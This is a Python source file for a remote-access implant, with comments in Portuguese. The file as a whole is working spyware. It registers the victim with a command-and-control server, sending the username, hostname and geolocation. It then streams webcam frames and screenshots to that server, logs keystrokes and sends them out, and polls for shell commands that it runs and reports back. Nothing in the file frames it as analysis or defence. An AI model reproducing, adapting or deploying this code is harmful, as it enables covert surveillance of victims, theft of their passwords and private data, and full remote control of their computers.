import socket
import os
import subprocess
import platform
import pyautogui
import cv2
import requests
import pynput.keyboard
import threading
import time
from PIL import ImageGrab
import io

# CONFIGURAÇÕES
C2_URL = "http://192.168.0.1:5000"

class Implant:
    def __init__(self):
        self.key_log = ""
        self.running = True

    def get_sys_info(self):
        try:
            r = requests.get('https://ipapi.co/json/').json()
            info = {
                "os": platform.system(),
                "user": os.getlogin(),
                "ip": r.get('ip'),
                "city": r.get('city'),
                "region": r.get('region'),
                "country": r.get('country_name'),
                "hostname": socket.gethostname()
            }
            return info
        except:
            return {"error": "Falha ao obter info"}

    def stream_camera(self):
        cap = cv2.VideoCapture(0)
        while self.running:
            ret, frame = cap.read()
            if ret:
                _, img_encoded = cv2.imencode('.jpg', frame)
                requests.post(f"{C2_URL}/upload_cam", files={"file": ("cam.jpg", img_encoded.tobytes(), "image/jpeg")})
            time.sleep(0.5) # Intervalo para não travar a rede

    def stream_screen(self):
        while self.running:
            screenshot = ImageGrab.grab()
            img_byte_arr = io.BytesIO()
            screenshot.save(img_byte_arr, format='JPEG')
            requests.post(f"{C2_URL}/upload_screen", files={"file": ("screen.jpg", img_byte_arr.getvalue(), "image/jpeg")})
            time.sleep(1)

    def keylogger(self):
        def on_press(key):
            self.key_log += str(key)
            if len(self.key_log) > 20:
                requests.post(f"{C2_URL}/upload_keys", data={"keys": self.key_log})
                self.key_log = ""
        
        with pynput.keyboard.Listener(on_press=on_press) as listener:
            listener.join()

    def execute_remote(self):
        while self.running:
            try:
                res = requests.get(f"{C2_URL}/get_cmd").json()
                cmd = res.get("command")
                if cmd:
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT)
                    requests.post(f"{C2_URL}/cmd_res", data={"output": output})
            except:
                pass
            time.sleep(2)

    def start(self):
        # Envia info inicial
        requests.post(f"{C2_URL}/register", json=self.get_sys_info())
        
        # Inicia threads de coleta
        threading.Thread(target=self.stream_camera, daemon=True).start()
        threading.Thread(target=self.stream_screen, daemon=True).start()
        threading.Thread(target=self.keylogger, daemon=True).start()
        threading.Thread(target=self.execute_remote, daemon=True).start()
        
        while True: time.sleep(1)

if __name__ == "__main__":
    Implant().start()
